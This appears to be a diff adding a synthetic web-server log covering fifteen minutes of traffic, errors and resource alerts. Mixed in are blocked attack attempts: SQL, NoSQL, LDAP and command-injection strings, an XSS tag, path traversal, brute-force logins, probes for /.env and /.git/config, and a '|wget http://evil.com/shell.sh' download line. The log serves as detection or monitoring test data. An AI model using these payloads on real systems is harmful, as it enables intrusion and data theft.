@@ -1,0 +1,108 @@
+2026-03-13 08:00:01 INFO [WebServer] Server started on port 8080
+2026-03-13 08:00:02 INFO [SystemMonitor] CPU Usage: 12%, Memory: 45%, Disk: 62%
+2026-03-13 08:00:05 INFO [WebServer] GET /index.html 200 45ms 192.168.1.10
+2026-03-13 08:00:06 INFO [WebServer] GET /api/users 200 120ms 192.168.1.15
+2026-03-13 08:00:08 INFO [WebServer] POST /api/login 200 89ms 192.168.1.20
+2026-03-13 08:00:10 INFO [AuthService] User 'admin' logged in successfully from 192.168.1.20
+2026-03-13 08:00:15 INFO [WebServer] GET /api/dashboard 200 200ms 192.168.1.20
+2026-03-13 08:00:20 WARNING [SystemMonitor] CPU Usage: 78%, Memory: 72%, Disk: 62%
+2026-03-13 08:00:25 INFO [WebServer] GET /static/css/style.css 200 15ms 192.168.1.10
+2026-03-13 08:00:30 INFO [WebServer] GET /api/products 200 340ms 192.168.1.25
+2026-03-13 08:01:00 WARNING [WebServer] GET /api/reports 200 1520ms 192.168.1.30 - Slow response detected
+2026-03-13 08:01:05 INFO [WebServer] POST /api/orders 201 95ms 192.168.1.25
+2026-03-13 08:01:10 ERROR [Database] Connection pool exhausted - max connections reached (100/100)
+2026-03-13 08:01:11 ERROR [WebServer] GET /api/users 503 5ms 192.168.1.15 - Service Unavailable
+2026-03-13 08:01:12 ERROR [WebServer] POST /api/orders 503 3ms 192.168.1.25 - Service Unavailable
+2026-03-13 08:01:15 WARNING [Database] Connection pool recovered - active connections (85/100)
+2026-03-13 08:01:20 INFO [WebServer] GET /api/users 200 150ms 192.168.1.15
+2026-03-13 08:02:00 WARNING [WebServer] GET /api/search?q=SELECT+*+FROM+users+WHERE+1%3D1 400 5ms 10.0.0.55 - Suspicious query parameter
+2026-03-13 08:02:01 WARNING [SecurityModule] SQL Injection attempt detected from IP 10.0.0.55: pattern "SELECT * FROM users WHERE 1=1"
+2026-03-13 08:02:05 WARNING [WebServer] GET /api/search?q=%3Cscript%3Ealert('xss')%3C/script%3E 400 3ms 10.0.0.55 - Suspicious query parameter
+2026-03-13 08:02:06 WARNING [SecurityModule] XSS attempt detected from IP 10.0.0.55: pattern "<script>alert('xss')</script>"
+2026-03-13 08:02:10 WARNING [WebServer] GET /../../etc/passwd 403 2ms 10.0.0.55 - Path traversal blocked
+2026-03-13 08:02:11 WARNING [SecurityModule] Path traversal attempt detected from IP 10.0.0.55: pattern "../../etc/passwd"
+2026-03-13 08:03:00 WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 1/5)
+2026-03-13 08:03:02 WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 2/5)
+2026-03-13 08:03:04 WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 3/5)
+2026-03-13 08:03:06 WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 4/5)
+2026-03-13 08:03:08 WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 5/5)
+2026-03-13 08:03:09 ERROR [AuthService] Account 'admin' locked due to 5 consecutive failed login attempts from 10.0.0.88
+2026-03-13 08:03:10 CRITICAL [SecurityModule] Brute-force attack detected on account 'admin' from IP 10.0.0.88
+2026-03-13 08:03:15 INFO [SecurityModule] IP 10.0.0.88 added to blocklist
+2026-03-13 08:04:00 INFO [WebServer] GET /api/products 200 280ms 192.168.1.30
+2026-03-13 08:04:05 INFO [WebServer] POST /api/upload 200 450ms 192.168.1.20
+2026-03-13 08:04:10 WARNING [SystemMonitor] CPU Usage: 92%, Memory: 88%, Disk: 75%
+2026-03-13 08:04:11 CRITICAL [SystemMonitor] CPU Usage exceeded 90% threshold!
+2026-03-13 08:04:12 WARNING [SystemMonitor] Memory usage exceeded 85% threshold!
+2026-03-13 08:04:15 INFO [WebServer] GET /api/dashboard 200 890ms 192.168.1.20
+2026-03-13 08:04:20 WARNING [WebServer] GET /api/reports/annual 200 3200ms 192.168.1.30 - Slow response detected
+2026-03-13 08:04:25 INFO [WebServer] GET /api/notifications 200 65ms 192.168.1.10
+2026-03-13 08:05:00 ERROR [WebServer] POST /api/payment 500 2100ms 192.168.1.25 - Internal Server Error
+2026-03-13 08:05:01 ERROR [PaymentService] Payment processing failed: timeout connecting to payment gateway
+2026-03-13 08:05:05 ERROR [WebServer] POST /api/payment 500 2050ms 192.168.1.25 - Internal Server Error
+2026-03-13 08:05:06 ERROR [PaymentService] Payment processing failed: timeout connecting to payment gateway
+2026-03-13 08:05:10 WARNING [SystemMonitor] Disk I/O latency: 250ms (threshold: 100ms)
+2026-03-13 08:05:15 INFO [WebServer] GET /api/products 200 195ms 192.168.1.10
+2026-03-13 08:05:20 INFO [WebServer] GET /api/users/profile 200 88ms 192.168.1.20
+2026-03-13 08:06:00 WARNING [SystemMonitor] CPU Usage: 65%, Memory: 70%, Disk: 78%
+2026-03-13 08:06:05 INFO [WebServer] GET /api/orders 200 175ms 192.168.1.25
+2026-03-13 08:06:10 INFO [WebServer] DELETE /api/orders/1542 200 45ms 192.168.1.25
+2026-03-13 08:06:15 INFO [CacheService] Cache hit ratio: 72% (threshold: 80%)
+2026-03-13 08:06:16 WARNING [CacheService] Cache hit ratio below threshold - consider cache optimization
+2026-03-13 08:06:20 INFO [WebServer] GET /api/search?q=laptop 200 320ms 192.168.1.15
+2026-03-13 08:07:00 WARNING [WebServer] GET /api/search?q='+OR+'1'%3D'1'+--+ 400 4ms 10.0.0.99 - Suspicious query parameter
+2026-03-13 08:07:01 WARNING [SecurityModule] SQL Injection attempt detected from IP 10.0.0.99: pattern "' OR '1'='1' -- "
+2026-03-13 08:07:05 WARNING [WebServer] POST /api/login 401 15ms 10.0.0.99 - Invalid credentials
+2026-03-13 08:07:06 WARNING [WebServer] POST /api/login 401 12ms 10.0.0.99 - Invalid credentials
+2026-03-13 08:07:07 WARNING [WebServer] POST /api/login 401 10ms 10.0.0.99 - Invalid credentials
+2026-03-13 08:07:08 WARNING [SecurityModule] Rapid login attempts detected from IP 10.0.0.99 (3 attempts in 3 seconds)
+2026-03-13 08:07:10 INFO [SecurityModule] IP 10.0.0.99 added to watchlist
+2026-03-13 08:08:00 ERROR [WebServer] GET /api/reports/export 500 45ms 192.168.1.30 - Internal Server Error
+2026-03-13 08:08:01 ERROR [ReportService] Failed to generate report: OutOfMemoryError
+2026-03-13 08:08:05 CRITICAL [SystemMonitor] Memory usage: 96% - approaching system limit!
+2026-03-13 08:08:06 WARNING [SystemMonitor] Automatic memory cleanup triggered
+2026-03-13 08:08:10 INFO [SystemMonitor] Memory cleanup completed - freed 1.2GB, current usage: 68%
+2026-03-13 08:08:15 INFO [WebServer] GET /api/reports/export 200 520ms 192.168.1.30
+2026-03-13 08:09:00 INFO [WebServer] GET /api/products 200 145ms 192.168.1.10
+2026-03-13 08:09:05 INFO [WebServer] POST /api/cart 201 78ms 192.168.1.10
+2026-03-13 08:09:10 INFO [WebServer] GET /api/cart 200 55ms 192.168.1.10
+2026-03-13 08:09:15 WARNING [WebServer] GET /api/recommendations 200 2800ms 192.168.1.10 - Slow response detected
+2026-03-13 08:09:20 INFO [WebServer] POST /api/checkout 200 680ms 192.168.1.10
+2026-03-13 08:10:00 INFO [SchedulerService] Running scheduled task: database_backup
+2026-03-13 08:10:05 INFO [Database] Starting database backup...
+2026-03-13 08:10:30 INFO [SystemMonitor] CPU Usage: 55%, Memory: 60%, Disk: 80%
+2026-03-13 08:10:35 WARNING [SystemMonitor] Disk usage exceeded 80% threshold!
+2026-03-13 08:11:00 INFO [Database] Database backup completed successfully (size: 2.4GB)
+2026-03-13 08:11:05 INFO [SchedulerService] Scheduled task 'database_backup' completed in 65 seconds
+2026-03-13 08:12:00 INFO [WebServer] GET /health 200 5ms 192.168.1.1
+2026-03-13 08:12:01 INFO [WebServer] Health check: all services operational
+2026-03-13 08:12:05 INFO [WebServer] GET /api/users 200 110ms 192.168.1.15
+2026-03-13 08:12:10 INFO [WebServer] POST /api/users 201 95ms 192.168.1.20
+2026-03-13 08:12:15 INFO [WebServer] PUT /api/users/245 200 85ms 192.168.1.20
+2026-03-13 08:13:00 WARNING [WebServer] POST /api/upload 413 2ms 192.168.1.30 - Payload Too Large (52MB, limit: 50MB)
+2026-03-13 08:13:05 INFO [WebServer] POST /api/upload 200 1200ms 192.168.1.30
+2026-03-13 08:14:00 INFO [SystemMonitor] CPU Usage: 35%, Memory: 55%, Disk: 80%
+2026-03-13 08:14:05 INFO [WebServer] GET /api/analytics 200 450ms 192.168.1.20
+2026-03-13 08:14:10 INFO [WebServer] GET /api/settings 200 35ms 192.168.1.20
+2026-03-13 08:14:15 INFO [WebServer] PUT /api/settings 200 42ms 192.168.1.20
+2026-03-13 08:14:30 WARNING [WebServer] GET /api/exec?cmd=;cat+/etc/passwd 400 3ms 10.0.0.55 - Suspicious parameter
+2026-03-13 08:14:31 WARNING [SecurityModule] Command Injection attempt detected from IP 10.0.0.55: pattern "; cat /etc/passwd"
+2026-03-13 08:14:35 WARNING [WebServer] POST /api/exec 400 2ms 10.0.0.55 - Command execution attempt: "|wget http://evil.com/shell.sh"
+2026-03-13 08:14:36 CRITICAL [SecurityModule] OS Command Injection detected from IP 10.0.0.55: attempted to execute "/bin/bash -c wget"
+2026-03-13 08:14:40 WARNING [WebServer] POST /api/query 400 5ms 10.0.0.77 - Malformed query
+2026-03-13 08:14:41 WARNING [SecurityModule] NoSQL Injection attempt detected from IP 10.0.0.77: pattern {"$gt": ""} in query parameter
+2026-03-13 08:14:45 WARNING [WebServer] POST /api/users/search 400 4ms 10.0.0.77 - Suspicious payload
+2026-03-13 08:14:46 WARNING [SecurityModule] NoSQL Injection attempt detected from IP 10.0.0.77: pattern {"$ne": null} bypass
+2026-03-13 08:14:50 WARNING [WebServer] POST /api/auth/ldap 400 6ms 10.0.0.77 - Invalid LDAP query
+2026-03-13 08:14:51 WARNING [SecurityModule] LDAP Injection attempt detected from IP 10.0.0.77: pattern "*)(&" in username field
+2026-03-13 08:14:55 WARNING [WebServer] GET /.env 403 1ms 10.0.0.55 - Forbidden
+2026-03-13 08:14:56 WARNING [SecurityModule] Forced browsing attempt from IP 10.0.0.55: tried to access /.env (access denied)
+2026-03-13 08:14:58 WARNING [WebServer] GET /.git/config 403 1ms 10.0.0.55 - Forbidden
+2026-03-13 08:14:59 WARNING [SecurityModule] Forced browsing attempt from IP 10.0.0.55: tried to access /.git/config (access denied)
+2026-03-13 08:15:00 INFO [CronJob] Running log rotation...
+2026-03-13 08:15:05 INFO [CronJob] Log rotation completed - archived 3 log files
+2026-03-13 08:15:10 INFO [SystemMonitor] CPU Usage: 28%, Memory: 52%, Disk: 76%
+2026-03-13 08:15:15 INFO [WebServer] GET /api/dashboard 200 180ms 192.168.1.20
+2026-03-13 08:15:20 INFO [WebServer] Server status: 85 requests processed in last 15 minutes
+2026-03-13 08:15:25 INFO [WebServer] Average response time: 287ms
+2026-03-13 08:15:30 INFO [SystemMonitor] System summary - Uptime: 15m 29s, Total requests: 85, Errors: 9, Warnings: 22
